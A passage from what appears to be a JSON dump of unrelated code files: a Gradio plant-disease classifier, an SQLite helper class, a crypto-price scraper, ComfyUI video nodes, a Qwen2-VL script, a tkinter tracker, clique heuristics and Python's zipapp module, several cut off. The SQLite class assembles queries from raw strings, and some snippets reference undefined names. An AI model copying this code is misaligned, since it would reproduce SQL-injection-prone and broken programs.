(https://huggingface.co/spaces)\\n\"]},{\"output_type\":\"display_data\",\"data\":{\"text/plain\":[\"<IPython.core.display.HTML object>\"],\"text/html\":[\"<div><iframe src=\\\"https://0f5b3efaaf510764c2.gradio.live\\\" width=\\\"100%\\\" height=\\\"500\\\" allow=\\\"autoplay; camera; microphone; clipboard-read; clipboard-write;\\\" frameborder=\\\"0\\\" allowfullscreen></iframe></div>\"]},\"metadata\":{}}],\"source\":[\"#!pip install gradio\\n\",\"#!pip install tensorflow\\n\",\"\\n\",\"from IPython import get_ipython\\n\",\"from IPython.display import display\\n\",\"# %%\\n\",\"import gradio as gr\\n\",\"from tensorflow.keras.models import load_model\\n\",\"from tensorflow.keras.preprocessing.image import img_to_array, load_img\\n\",\"import numpy as np\\n\",\"\\n\",\"# Load the trained CNN model\\n\",\"# Mount Google Drive\\n\",\"from google.colab import drive\\n\",\"drive.mount('/content/drive')\\n\",\"\\n\",\"# ... (Import necessary libraries)\\n\",\"\\n\",\"# Load the trained CNN model with the correct path\\n\",\"model_path = '/content/drive/MyDrive/Colab Notebooks/classifier.h5'  # Update with your actual folder name if different\\n\",\"model = load_model(model_path)\\n\",\"\\n\",\"# Define the classes (update these based on your model's classes)\\n\",\"classes = [\\n\",\"    \\\"Corn_(maize): Healthy\\\",\\n\",\"    \\\"Corn_(maize): Cercospora_leaf_spot Gray_leaf_spot\\\",\\n\",\"    \\\"Corn_(maize): Common_rust\\\",\\n\",\"    \\\"Corn_(maize): Northern_Leaf_Blight\\\",\\n\",\"    \\\"Pepper,_bell: Healthy\\\",\\n\",\"    \\\"Pepper,_bell: Bacterial_pepper_spot\\\",\\n\",\"    \\\"Tomato: healthy\\\",\\n\",\"    \\\"Tomato: Bacterial_spot\\\",\\n\",\"    \\\"Tomato: Early_blight\\\",\\n\",\"    \\\"Tomato: Late_blight\\\",\\n\",\"    \\\"Tomato: Leaf_mold\\\",\\n\",\"    \\\"Tomato: Septoria_leaf_spot\\\",\\n\",\"    \\\"Tomato: Spider_mites Two-spotted_spider_mite\\\",\\n\",\"    \\\"Tomato: Target_spot\\\",\\n\",\"    \\\"Tomato: Tomato_Yellow_Leaf_curl_virus\\\",\\n\",\"    \\\"Tomato: Tomato_mosaic_virus\\\",\\n\",\"]\\n\",\"\\n\",\"# Prediction function\\n\",\"def predict_disease(image):\\n\",\"    \\\"\\\"\\\"\\n\",\"    Predict plant disease from an uploaded image.\\n\",\"    \\\"\\\"\\\"\\n\",\"    try:\\n\",\"        # Resize image to match model input size\\n\",\"        image = image.resize((64, 64))  # Ensure this matches your model's input shape\\n\",\"        image_array = img_to_array(image)\\n\",\"        image_array = np.expand_dims(image_array, axis=0)  # Add batch dimension\\n\",\"        image_array = image_array / 255.0  # Normalize pixel values\\n\",\"\\n\",\"        # Make prediction\\n\",\"        prediction = model.predict(image_array)\\n\",\"        predicted_class = np.argmax(prediction)  # Get index of max probability\\n\",\"        confidence = np.max(prediction)  # Get probability of prediction\\n\",\"\\n\",\"        # Return the class label and confidence\\n\",\"        return f\\\"{classes[predicted_class]} (Confidence: {confidence:.2f})\\\"\\n\",\"\\n\",\"    except Exception as e:\\n\",\"        return f\\\"Error: {str(e)}\\\"\\n\",\"\\n\",\"# Gradio interface\\n\",\"interface = gr.Interface(\\n\",\"    fn=predict_disease,\\n\",\"    inputs=gr.Image(type=\\\"pil\\\"),  # Accepts an image file\\n\",\"    outputs=\\\"text\\\",              # Outputs a text result\\n\",\"    title=\\\"Plant Disease Detection\\\",\\n\",\"    description=\\\"Upload an image of a corn, pepper, or tomato leaf to identify its health status or disease.\\\"\\n\",\")\\n\",\"\\n\",\"# Launch the Gradio app\\n\",\"if __name__ == \\\"__main__\\\":\\n\",\"    interface.launch(share=True)\\n\",\"\\n\"]}]}",
    "import sqlite3\nimport tkinter as tk\nimport inspect\n\n\nn_szam = 0\nclass sqlite:\n    version = \"EasyDB 1.1\"\n    creator = \"Gyuris D\u00e1niel\"\n    website = [\"https://op.gyuris.hu\", \n               \"https://dani.gyuris.hu\"]\n    github = \"https://github.com/simsononroad\"\n    \n    \n    def __init__(self, db_name: str, debug_mode: bool):\n        self.db_name = db_name\n        self.log = debug_mode\n        if self.log:\n            print(f\"\"\"Courrent version: {sqlite.version}\\n\nCreated by: {sqlite.creator}\\n\nWebsites: 1 {sqlite.website[0]} \\n\n          2 {sqlite.website[1]}\\n\nGithub: {sqlite.github}\"\"\")\n        else:\n            pass\n\n\n    def init_db(self):\n        con = sqlite3.connect(f\"{self.db_name}\")\n        cur = con.cursor()\n        if self.log:\n            print(\"Database created\")\n        else:\n            pass\n\n    def create_table(self, table_name, column_name):\n        con = sqlite3.connect(self.db_name)\n        cur = con.cursor()\n        coloumn = \"\"\n        for col in column_name:\n            coloumn += f\"{col}, \"\n        coloumn = coloumn[:-2]\n        try:\n            cur.execute(f\"CREATE TABLE {table_name}(id INTEGER PRIMARY KEY AUTOINCREMENT, {coloumn})\")\n            if self.log:\n                print(\"Table created\")\n            else:\n                pass\n        except:\n            pass\n\n    def add_element(self, table_name: str, column_name: list, contents: list):\n        coloumn = \"\"\n        content = \"\"\n        for col in column_name:\n            coloumn += f\"{col}, \"\n        coloumn = coloumn[:-2]\n\n        for cont in contents:\n            content += f\"{cont}, \"\n        content = content[:-2]\n        print(content)\n        con = sqlite3.connect(self.db_name)\n        cur = con.cursor()\n        ins = cur.execute(f\"insert into {table_name} ({coloumn}) values {content}\")\n        con.commit()\n        if self.log:\n            print(f\"{content} placed here: {column_name}\")\n        else:\n            pass\n\n\n    def select_item(self, table_name: str, column_name: list):\n        con = sqlite3.connect(self.db_name)\n        cur = con.cursor()\n        coloumn = \"\"\n        content = \"\"\n        for col in column_name:\n            coloumn += f\"{col}, \"\n        coloumn = coloumn[:-2]\n        ins = cur.execute(f\"select {coloumn} FROM {table_name}\")\n        output = cur.fetchall()\n        return output\n\n    def delete_row(self, table_name: str, condition: str):\n        con = sqlite3.connect(self.db_name)\n        cur = con.cursor()\n        ins = cur.execute(f\"DELETE FROM {table_name} WHERE {condition}\")\n        con.commit()\n        if self.log:\n            print(f\"Element deleted where: {condition}\")\n        else:\n            pass\n        \n    def update_row(self, table_name: str, column_name: str, new_value: str, condition: str):\n        con = sqlite3.connect(self.db_name)\n        cur = con.cursor()\n        ins = cur.execute(f\"UPDATE {table_name} SET {column_name} = '{new_value}' WHERE {condition}\")\n        con.commit()\n        if self.log:\n            print(f\"Element updated where: {condition} to {new_value}\")\n        else:\n            pass\n        \n        \n    def get_db_info(self, table_name: str, column_name: list):\n        global n_szam\n        conn = sqlite3.connect(self.db_name)\n        cursor = conn.cursor()\n\n        # Lek\u00e9rdez\u00e9s futtat\u00e1sa\n        cursor.execute(f\"SELECT * FROM {table_name}\")\n\n        self.table = table_name\n        # Adatok lek\u00e9r\u00e9se\n        coloumns_db = cursor.fetchall()\n        \n        cursor.execute(f\"SELECT seq FROM sqlite_sequence\")\n        rows = cursor.fetchall()\n        \n        b_row = \"\"\n        num_row = 0\n        for row in column_name:\n            b_row = row\n            id = b_row[1]\n\n\n        cursor.execute(f\"SELECT id FROM {table_name}\")\n        id = cursor.fetchall()\n        for ids in id:\n            num_row += 1\n\n        #num of coloumn\n        szam = 0\n        big_col = \"\"\n        for col in column_name:\n            szam += 1\n            n_szam += 1\n            #print(f\"{szam}-dik elem: {col}\")\n            big_col += f\"{col}, \"\n            b_row = row[szam]\n        big_col = big_col[:-2]\n        \n        \n\n        # Kapcsolat lez\u00e1r\u00e1sa\n        conn.close()\n        \n        return self.db_name, big_col, num_row, szam+1\n    \n    def add_variable(self, variable):\n            \"\"\"Elt\u00e1rolja a v\u00e1ltoz\u00f3 nev\u00e9t \u00e9s \u00e9rt\u00e9k\u00e9t az adatb\u00e1zisban.\"\"\"\n            # H\u00edv\u00f3 keret vizsg\u00e1lata\n            frame = inspect.currentframe().f_back\n            var_name = None\n\n            for name, val in frame.f_locals.items():\n                if val is variable:\n                    var_name = name\n                    break\n\n            if var_name is None:\n                raise ValueError(\"Nem siker\u00fclt azonos\u00edtani a v\u00e1ltoz\u00f3 nev\u00e9t.\")\n\n            # Adatb\u00e1zisba ment\u00e9s\n            con = sqlite3.connect(self.db_name)\n            cur = con.cursor()\n            cur.execute(\"INSERT INTO variables (name, value) VALUES (?, ?)\", (var_name, str(variable)))\n            con.commit()\n            con.close()\n\n      ",
    "'''\nThis program queries coingecko for crypto currency coins prices in USD\nIt only runs for multiple coins\nThe urls require a specific date, and are generated using the datetime timedelta library, to handle things like leap year(s)\nThe data is written to a csv\n'''\n\n\nimport requests\nimport json\nimport time\nfrom datetime import datetime, timedelta\n\n\n# example url for coingecko.com\nexample_url = \"https://api.coingecko.com/api/v3/coins/ethereum/history?date=31-05-2022&localization=false\"\n\n\n# url pieces, coin and date go in between  \nurl1 = \"https://api.coingecko.com/api/v3/coins/\"\nurl2 = \"/history?date=\"\nurl3 = \"&localization=false\"\n\n# variables to pull coingecko data\nkey_md = 'market_data'\nkey_prc = 'current_price'\nkey_usd = 'usd'\n\n# start date 2022-05-30   NOTE: integers do not start with 0 in Python like they often do in dates\ndt = datetime(2022, 5, 30)\n\n# example increasing the day by 1\ndt += timedelta(days=1)\ndt_s = dt.strftime(\"%d-%m-%Y\") # string format required by coingecko\n\n    \n    \n#####################################################################\n# Running program for all coins\ncoins = [ \"bitcoin\", \"ethereum\", \"ripple\", \"cardano\", \"bitcoin-cash\", \"eos\", \"litecoin\"]\n\n# iterate through coins, generate csv files, write prices\nfor coin in coins:\n    # create csv for coin\n    file = open(coin + \".csv\", \"w\")\n    file.write(\"Date,\" + coin + \"\\n\")\n    for i in range(364):\n        # increment day using a timedelta object\n        dt += timedelta(days=1)\n        dt_s = dt.strftime(\"%d-%m-%Y\")\n        url = url1 + coin + url2 + dts + url3\n        print(\"url: \", url)\n        \n        # get json from coingecko for coin and date\n        req = requests.get(url)\n        time.sleep(1) # sleep to avoid \"too many requests\" errors from coingecko\n        d = json.loads(req.text)\n        \n        # write price to csv file\n        print(dt_s, d[key_md][key_prc][key_usd])\n        file.write(dt_s + \",\" + str(d[key_md][key_prc][key_usd]) + \"\\n\")\n        file.flush()\n        \n# close file\nfile.close()\n",
    "import torch\nfrom comfy import model_management\nimport folder_paths\nfrom .evtexture.evtexture_arch import EvTexture\nfrom .esim import events_generator, events_to_image, EventSimulatorConfig\nfrom .evoxels import package_bidirectional_event_voxels\n\nEVENTS_TYPE = \"EVT_EVENTS\"\nEVTEXTURE_MODEL_TYPE = \"EVTEXTURE_MODEL\"\n\n\nclass VideoToEvents:\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\"images\": (\"IMAGE\", {}), \"fps\": (\"FLOAT\", {})},\n        }\n\n    RETURN_TYPES = (EVENTS_TYPE,)\n    RETURN_NAMES = (\"events\",)\n    CATEGORY = \"EVTexture\"\n    FUNCTION = \"events\"\n\n    def events(self, images, fps: float):\n        imgs = torch.mean(images, dim=3)\n        log_imgs = (imgs + 1e-3).log()\n\n        timestamps = [i / fps for i in range(len(images))]\n        config = EventSimulatorConfig()\n        return (list(events_generator(log_imgs, timestamps, config)),)\n\n\nclass EventsToImage:\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"events\": (EVENTS_TYPE, {\"forceInput\": True}),\n                \"width\": (\"INT\", {}),\n                \"height\": (\"INT\", {}),\n            },\n        }\n\n    RETURN_TYPES = (\"IMAGE\",)\n    RETURN_NAMES = (\"images\",)\n    CATEGORY = \"EVTexture\"\n    FUNCTION = \"to_image\"\n\n    def to_image(self, events, height: int, width: int):\n        b, h, w = len(events), height, width\n        res = torch.zeros((b, h, w, 3))\n        for i in range(b):\n            res[i, :, :, :] = events_to_image(events[i], h, w).permute(1, 2, 0)\n        return (res,)\n\n\nclass LoadEvTextureModel:\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\n            \"required\": {\n                \"model_name\": (folder_paths.get_filename_list(\"upscale_models\"),),\n            }\n        }\n\n    RETURN_TYPES = (EVTEXTURE_MODEL_TYPE,)\n    RETURN_NAMES = (\"model\",)\n    CATEGORY = \"EVTexture\"\n    FUNCTION = \"load\"\n\n    def load(self, model_name):\n        path = folder_paths.get_full_path_or_raise(\"upscale_models\", model_name)\n        model = EvTexture()\n        params_dict = torch.load(path, weights_only=True)[\"params_ema\"]\n        model.load_state_dict(params_dict, strict=True)\n        return (model,)\n\n\nclass EvTextureUpscaleVideo:\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\n            \"required\": {\n                \"images\": (\"IMAGE\", {}),\n                \"events\": (EVENTS_TYPE, {}),\n                \"model\": (EVTEXTURE_MODEL_TYPE, {}),\n                \"fps\": (\"FLOAT\", {}),\n            }\n        }\n\n    RETURN_TYPES = (\"IMAGE\",)\n    RETURN_NAMES = (\"images\",)\n    CATEGORY = \"EVTexture\"\n    FUNCTION = \"upscale\"\n\n    def upscale(self, images, events, model: EvTexture, fps: float):\n        device = model_management.get_torch_device()\n\n        n, h, w, _ = images.shape\n        memory_required = model_management.module_size(model)\n        memory_required += (\n            n * (h * w * 3) * images.element_size() * 4 * 384.0\n        )  # The 384.0 is an estimate of how much some of these models take, TODO: make it more accurate\n        memory_required += images.nelement() * images.element_size()\n        model_management.free_memory(memory_required, device)\n\n        model.to(device)\n        imgs = images.movedim(-1, -3).unsqueeze(0).to(device)\n        events = torch.vstack(events).to(device)\n\n        xs, ys, ts, pols = events.T\n        timestamps = [i / fps for i in range(n)]\n        bins = 5\n        voxels_f = torch.stack(\n            package_bidirectional_event_voxels(\n                xs, ys, ts, pols, timestamps, False, bins, (h, w)\n            )\n        ).unsqueeze(0)\n        voxels_b = torch.stack(\n            package_bidirectional_event_voxels(\n                xs, ys, ts, pols, timestamps, True, bins, (h, w)\n            )\n        ).unsqueeze(0)\n        del xs, ys, ts, pols, events\n\n        s = model.forward(imgs, voxels_f, voxels_b)[0].to(\"cpu\")\n\n        model.to(\"cpu\")\n        s = torch.clamp(s.movedim(-3, -1), min=0, max=1.0)\n        return (s,)\n\n\nNODE_CLASS_MAPPINGS = {\n    \"EVTVideoToEvents\": VideoToEvents,\n    \"EVTEventsToImage\": EventsToImage,\n    \"EVTLoadEvTextureModel\": LoadEvTextureModel,\n    \"EVTTextureUpscaleVideo\": EvTextureUpscaleVideo,\n}\nNODE_DISPLAY_NAME_MAPPINGS = {\n    \"EVTVideoToEvents\": \"Video to Camera Events\",\n    \"EVTEventsToImage\": \"Camera Events To Images\",\n    \"EVTLoadEvTextureModel\": \"Load EvTexture Model\",\n    \"EVTTextureUpscaleVideo\": \"EvTexture Video Upscale\",\n}\n",
    "from transformers import Qwen2VLForConditionalGeneration, AutoTokenizer, AutoProcessor\nfrom qwen_vl_utils import process_vision_info\nimport torch\n\nmodel = Qwen2VLForConditionalGeneration.from_pretrained(\n    \"/home/liyou/opensource_models/qwen2-vl-7b\",\n    torch_dtype=torch.bfloat16,\n    attn_implementation=\"flash_attention_2\", # Enabling flash_attention_2 for better acceleration and memory saving, especially in multi-image and video scenarios is recommended.\n    device_map=\"auto\",\n)\n\nmessages = [\n    {\n        \"role\": \"user\",\n        \"content\": [\n            {\n                \"type\": \"image\",\n                \"image\": resize(\"./figs/multi_view_1.png\"),\n            },\n            {\n                \"type\": \"image\",\n                \"image\": resize(\"./figs/multi_view_2.png\"),\n            },\n            {\n                \"type\": \"image\",\n                \"image\": resize(\"./figs/multi_view_3.png\"),\n            },\n            {\n                \"type\": \"image\",\n                \"image\": resize(\"./figs/multi_view_4.png\"),\n            },\n            {\n                \"type\": \"text\",\n                \"text\": \"Please recognize <|object_ref_start|>the common person appearing in all these images<|object_ref_end|> and locate this person in all these image.\"\n            }\n        ]\n    }\n]\n\ntext = processor.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)\nimage_inputs, video_inputs = process_vision_info(messages)\ninputs = processor(text=[text],images=image_inputs,videos=video_inputs,padding=True,return_tensors=\"pt\",)\ninputs = inputs.to(\"cuda\")\n\n# Inference: Generation of the output\ngenerated_ids = model.generate(**inputs, max_new_tokens=128)\ngenerated_ids_trimmed = [\n    out_ids[len(in_ids) :] for in_ids, out_ids in zip(inputs.input_ids, generated_ids)\n]\noutput_text = processor.batch_decode(\n    generated_ids_trimmed, skip_special_tokens=True, clean_up_tokenization_spaces=False\n)\nprint(output_text)\n",
    "import tkinter as tk\nfrom tkinter import ttk, messagebox, simpledialog\nfrom datetime import datetime\nimport json\nimport matplotlib.pyplot as plt\nfrom matplotlib.dates import date2num\nfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAgg\n\nDATA_FILE = \"time_tracker_data.json\"\n\n# Load data from file\ndef load_data():\n    try:\n        with open(DATA_FILE, \"r\", encoding=\"utf-8\") as f:\n            return json.load(f)\n    except (FileNotFoundError, json.JSONDecodeError):\n        return {}\n\n# Save data to file\ndef save_data():\n    with open(DATA_FILE, \"w\", encoding=\"utf-8\") as f:\n        json.dump(items, f, ensure_ascii=False, indent=4)\n\n# Initialize data\nitems = load_data()\n\n# Helper functions\ndef fetch_items():\n    return [(name, data['last_recorded']) for name, data in items.items()]\n\ndef add_item(name):\n    if name in items:\n        return False\n    items[name] = {'last_recorded': \"\u672a\u8bb0\u5f55\", 'records': []}\n    save_data()\n    return True\n\ndef edit_item(old_name, new_name):\n    if new_name in items and old_name != new_name:\n        return False\n    items[new_name] = items.pop(old_name)\n    save_data()\n    return True\n\ndef delete_item(name):\n    if name in items:\n        del items[name]\n        save_data()\n        return True\n    return False\n\ndef add_record_to_item(name, record_time):\n    if name in items:\n        items[name]['records'].append(record_time)\n        items[name]['records'].sort()\n        items[name]['last_recorded'] = record_time\n        save_data()\n        return True\n    return False\n\ndef fetch_records(name):\n    if name in items:\n        return items[name]['records']\n    return []\n\nclass TimeTrackerApp:\n    def __init__(self, root):\n        self.root = root\n        self.root.title(\"\u65f6\u95f4\u8ddf\u8e2a\u5668  V2025.01.01 By vipnetant\")\n\n        self.create_widgets()\n\n    def create_widgets(self):\n        self.title_label = ttk.Label(self.root, text=\"\u65f6\u95f4\u8ddf\u8e2a\u5668\", font=(\"Arial\", 16))\n        self.title_label.pack(pady=10)\n\n        self.item_frame = ttk.Frame(self.root)\n        self.item_frame.pack(fill=\"both\", expand=True, padx=10, pady=10)\n\n        self.item_tree = ttk.Treeview(self.item_frame, columns=(\"\u5e8f\u53f7\", \"\u540d\u79f0\", \"\u6700\u540e\u8bb0\u5f55\u65f6\u95f4\"), show=\"headings\", height=10)\n        self.item_tree.heading(\"\u5e8f\u53f7\", text=\"\u5e8f\u53f7\")\n        self.item_tree.heading(\"\u540d\u79f0\", text=\"\u540d\u79f0\")\n        self.item_tree.heading(\"\u6700\u540e\u8bb0\u5f55\u65f6\u95f4\", text=\"\u6700\u540e\u8bb0\u5f55\u65f6\u95f4\")\n\n        self.item_tree.column(\"\u5e8f\u53f7\", width=50, anchor=\"center\")\n        self.item_tree.column(\"\u540d\u79f0\", width=150, anchor=\"center\")\n        self.item_tree.column(\"\u6700\u540e\u8bb0\u5f55\u65f6\u95f4\", width=200, anchor=\"center\")\n\n        self.item_tree.pack(side=\"left\", fill=\"both\", expand=True)\n\n        self.scrollbar = ttk.Scrollbar(self.item_frame, orient=\"vertical\", command=self.item_tree.yview)\n        self.item_tree.configure(yscroll=self.scrollbar.set)\n        self.scrollbar.pack(side=\"right\", fill=\"y\")\n\n        self.button_frame = ttk.Frame(self.root)\n        self.button_frame.pack(pady=10)\n\n        self.add_item_button = ttk.Button(self.button_frame, text=\"\u6dfb\u52a0\u9879\u76ee\", command=self.add_item_prompt)\n        self.add_item_button.grid(row=0, column=0, padx=5)\n\n        self.edit_item_button = ttk.Button(self.button_frame, text=\"\u7f16\u8f91\u9879\u76ee\", command=self.edit_item_prompt)\n        self.edit_item_button.grid(row=0, column=1, padx=5)\n\n        self.delete_item_button = ttk.Button(self.button_frame, text=\"\u5220\u9664\u9879\u76ee\", command=self.delete_item_prompt)\n        self.delete_item_button.grid(row=0, column=2, padx=5)\n\n        self.refresh_button = ttk.Button(self.button_frame, text=\"\u5237\u65b0\", command=self.refresh_items)\n        self.refresh_button.grid(row=0, column=3, padx=5)\n\n        self.item_tree.bind(\"<Double-1>\", self.open_item_details)\n        self.refresh_items()\n\n    def refresh_items(self):\n        for row in self.item_tree.get_children():\n            self.item_tree.delete(row)\n        items_list = fetch_items()\n        for idx, item in enumerate(items_list, start=1):\n            self.item_tree.insert(\"\", \"end\", values=(idx, item[0], item[1]))\n\n    def add_item_prompt(self):\n        name = simpledialog.askstring(\"\u6dfb\u52a0\u9879\u76ee\", \"\u8bf7\u8f93\u5165\u9879\u76ee\u540d\u79f0\uff1a\")\n        if name:\n            if add_item(name):\n                self.refresh_items()\n            else:\n                messagebox.showerror(\"\u9519\u8bef\", \"\u9879\u76ee\u540d\u79f0\u5df2\u5b58\u5728\uff01\")\n\n    def edit_item_prompt(self):\n        selected = self.item_tree.selection()\n        if not selected:\n            messagebox.showwarning(\"\u8b66\u544a\", \"\u8bf7\u5148\u9009\u62e9\u4e00\u4e2a\u9879\u76ee\uff01\")\n            return\n\n        old_name = self.item_tree.item(selected[0], \"values\")[1]\n        new_name = simpledialog.askstring(\"\u7f16\u8f91\u9879\u76ee\", \"\u8bf7\u8f93\u5165\u65b0\u7684\u9879\u76ee\u540d\u79f0\uff1a\", initialvalue=old_name)\n        if new_name and new_name != old_name:\n            if edit_item(old_name, new_name):\n                self.refresh_items()\n            else:\n                messagebox.showerror(\"\u9519\u8bef\", \"\u9879\u76ee\u540d\u79f0\u5df2\u5b58\u5728\uff01\")\n\n    def delete_item_prompt(self):\n        selected = self.item_tree.selection()\n        if not selected:\n            messagebox.showwarning(\"\u8b66\u544a\", \"\u8bf7\u5148\u9009\u62e9\u4e00\u4e2a\u9879\u76ee\uff01\")\n            return\n\n        name = self.item_tree.item(selected[0], \"values\")[1]\n        if messagebox.asky",
    "import networkx as nx \nimport random\nimport math\n\ndef genetic_algorithm_maximal_clique(G, population_size=300, generations=100, mutation_rate=0.3):\n    def random_clique():\n        nodes = list(G.nodes)\n        clique = set(random.sample(nodes, random.randint(1, len(nodes))))\n        return clique if is_clique(clique) else set()\n\n    def is_clique(nodes):\n        return all(G.has_edge(u, v) for u in nodes for v in nodes if u != v)\n\n    def fitness(clique):\n        return len(clique)\n    \n    def q_tournament_selection(population, fitness_func, new_population_size, q=5):\n        selected_population = []\n        for _ in range(new_population_size):\n            tournament = random.sample(population, q)\n            best_individual = max(tournament, key=fitness_func)\n            selected_population.append(best_individual)\n        return selected_population\n\n    def crossover_n_point(parent1, parent2, n_points=2):\n        parent1_list = list(parent1)\n        parent2_list = list(parent2)\n        length = min(len(parent1_list), len(parent2_list))\n\n        # Adjust n_points if it's too large\n        if n_points >= length:\n            n_points = length -1 \n\n        # Select crossover points\n        crossover_points = sorted(random.sample(range(1, length), n_points))\n        crossover_points = [0] + crossover_points + [length]\n\n\n        # Alternate segments between parents\n        child = []\n        for i in range(len(crossover_points) - 1):\n            if i % 2 == 0:  # Take segment from parent1\n                child += parent1_list[crossover_points[i]:crossover_points[i + 1]]\n            else:  # Take segment from parent2\n                child += parent2_list[crossover_points[i]:crossover_points[i + 1]]\n\n        child_set = set(child)\n        for node in list(child_set):\n            if not all(G.has_edge(node, v) for v in child_set if node != v):\n                child_set.remove(node)\n\n        return child_set\n\n    def mutate(clique, generation, total_generations):\n        rate = mutation_rate * (1 - generation / total_generations)  #decrease over time\n        if random.random() < rate:\n            node = random.choice(list(G.nodes))\n            if node not in clique:\n                if all(G.has_edge(node, v) for v in clique):\n                    clique.add(node)\n        return clique\n\n    def crossover_high_connectivity(parent1, parent2):\n        combined = set(parent1).union(parent2)\n        child = set()\n        for node in combined:\n            if all(G.has_edge(node, v) for v in child if v != node):\n                child.add(node)\n        return child\n\n    population = []\n    while len(population) != population_size :\n        randomClique = random_clique()\n        if is_clique(randomClique) and len(list(randomClique)) > 0:\n            population.append(randomClique)\n\n    for generation in range(generations):\n\n        population = sorted(population, key=fitness, reverse=True)\n        parents = population[:population_size // 2]\n\n        elitism_count = 5\n        offspring = parents[:elitism_count]\n        while len(offspring) < population_size:\n            p1, p2 = random.sample(parents, 2)\n            # child = crossover_n_point(p1, p2)\n            child = crossover_high_connectivity(p1, p2)\n            child = mutate(child, generation, generations)\n            offspring.append(child)\n\n        if generation % 10 == 0:\n            for _ in range(population_size // 10):\n                new_clique = random_clique()\n                if is_clique(new_clique):\n                    offspring.append(new_clique)\n\n\n        combined_population = parents + offspring\n\n        #use Q-Tournament to select the next generation\n        population = q_tournament_selection(combined_population, fitness, population_size, q=10)\n\n    return max(population, key=fitness)\n\n\ndef simulated_annealing_maximal_clique(G, initial_temperature=100, cooling_rate=0.99, iterations=1000):\n    def is_clique(nodes):\n        return all(G.has_edge(u, v) for u in nodes for v in nodes if u != v)\n\n    def fitness(clique):\n        return len(clique)\n\n    def neighbor(clique):\n        new_clique = set(clique)\n        node = random.choice(list(G.nodes))\n        if node in new_clique:\n            new_clique.remove(node)\n        else:\n            if all(G.has_edge(node, v) for v in new_clique):\n                new_clique.add(node)\n        return new_clique\n\n    initial_clique = set(random.choice(list(nx.find_cliques(G))))\n    current_clique = initial_clique\n    best_clique = current_clique\n    temperature = initial_temperature\n\n    for _ in range(iterations):\n        candidate = neighbor(current_clique)\n        if is_clique(candidate):  \n            delta = fitness(candidate) - fitness(current_clique)\n            if delta > 0 or random.random() < math.exp(delta / temperature):\n                current_clique = candidate\n                if fitness(current_clique) > fitness(best_clique):\n                    best_clique = current_clique\n        temperature *= cooling_",
    "import contextlib\nimport os\nimport pathlib\nimport shutil\nimport stat\nimport sys\nimport zipfile\n\n__all__ = ['ZipAppError', 'create_archive', 'get_interpreter']\n\n\n# The __main__.py used if the users specifies \"-m module:fn\".\n# Note that this will always be written as UTF-8 (module and\n# function names can be non-ASCII in Python 3).\n# We add a coding cookie even though UTF-8 is the default in Python 3\n# because the resulting archive may be intended to be run under Python 2.\nMAIN_TEMPLATE = \"\"\"\\\n# -*- coding: utf-8 -*-\nimport {module}\n{module}.{fn}()\n\"\"\"\n\n\n# The Windows launcher defaults to UTF-8 when parsing shebang lines if the\n# file has no BOM. So use UTF-8 on Windows.\n# On Unix, use the filesystem encoding.\nif sys.platform.startswith('win'):\n    shebang_encoding = 'utf-8'\nelse:\n    shebang_encoding = sys.getfilesystemencoding()\n\n\nclass ZipAppError(ValueError):\n    pass\n\n\n@contextlib.contextmanager\ndef _maybe_open(archive, mode):\n    if isinstance(archive, (str, os.PathLike)):\n        with open(archive, mode) as f:\n            yield f\n    else:\n        yield archive\n\n\ndef _write_file_prefix(f, interpreter):\n    \"\"\"Write a shebang line.\"\"\"\n    if interpreter:\n        shebang = b'#!' + interpreter.encode(shebang_encoding) + b'\\n'\n        f.write(shebang)\n\n\ndef _copy_archive(archive, new_archive, interpreter=None):\n    \"\"\"Copy an application archive, modifying the shebang line.\"\"\"\n    with _maybe_open(archive, 'rb') as src:\n        # Skip the shebang line from the source.\n        # Read 2 bytes of the source and check if they are #!.\n        first_2 = src.read(2)\n        if first_2 == b'#!':\n            # Discard the initial 2 bytes and the rest of the shebang line.\n            first_2 = b''\n            src.readline()\n\n        with _maybe_open(new_archive, 'wb') as dst:\n            _write_file_prefix(dst, interpreter)\n            # If there was no shebang, \"first_2\" contains the first 2 bytes\n            # of the source file, so write them before copying the rest\n            # of the file.\n            dst.write(first_2)\n            shutil.copyfileobj(src, dst)\n\n    if interpreter and isinstance(new_archive, str):\n        os.chmod(new_archive, os.stat(new_archive).st_mode | stat.S_IEXEC)\n\n\ndef create_archive(source, target=None, interpreter=None, main=None,\n                   filter=None, compressed=False):\n    \"\"\"Create an application archive from SOURCE.\n\n    The SOURCE can be the name of a directory, or a filename or a file-like\n    object referring to an existing archive.\n\n    The content of SOURCE is packed into an application archive in TARGET,\n    which can be a filename or a file-like object.  If SOURCE is a directory,\n    TARGET can be omitted and will default to the name of SOURCE with .pyz\n    appended.\n\n    The created application archive will have a shebang line specifying\n    that it should run with INTERPRETER (there will be no shebang line if\n    INTERPRETER is None), and a __main__.py which runs MAIN (if MAIN is\n    not specified, an existing __main__.py will be used).  It is an error\n    to specify MAIN for anything other than a directory source with no\n    __main__.py, and it is an error to omit MAIN if the directory has no\n    __main__.py.\n    \"\"\"\n    # Are we copying an existing archive?\n    source_is_file = False\n    if hasattr(source, 'read') and hasattr(source, 'readline'):\n        source_is_file = True\n    else:\n        source = pathlib.Path(source)\n        if source.is_file():\n            source_is_file = True\n\n    if source_is_file:\n        _copy_archive(source, target, interpreter)\n        return\n\n    # We are creating a new archive from a directory.\n    if not source.exists():\n        raise ZipAppError(\"Source does not exist\")\n    has_main = (source / '__main__.py').is_file()\n    if main and has_main:\n        raise ZipAppError(\n            \"Cannot specify entry point if the source has __main__.py\")\n    if not (main or has_main):\n        raise ZipAppError(\"Archive has no entry point\")\n\n    main_py = None\n    if main:\n        # Check that main has the right format.\n        mod, sep, fn = main.partition(':')\n        mod_ok = all(part.isidentifier() for part in mod.split('.'))\n        fn_ok = all(part.isidentifier() for part in fn.split('.'))\n        if not (sep == ':' and mod_ok and fn_ok):\n            raise ZipAppError(\"Invalid entry point: \" + main)\n        main_py = MAIN_TEMPLATE.format(module=mod, fn=fn)\n\n    if target is None:\n        target = source.with_suffix('.pyz')\n    elif not hasattr(target, 'write'):\n        target = pathlib.Path(target)\n\n    with _maybe_open(target, 'wb') as fd:\n        _write_file_prefix(fd, interpreter)\n        compression = (zipfile.ZIP_DEFLATED if compressed else\n                       zipfile.ZIP_STORED)\n        with zipfile.ZipFile(fd, 'w', compression=compression) as z:\n            for child in sorted(source.rglob('*')):\n           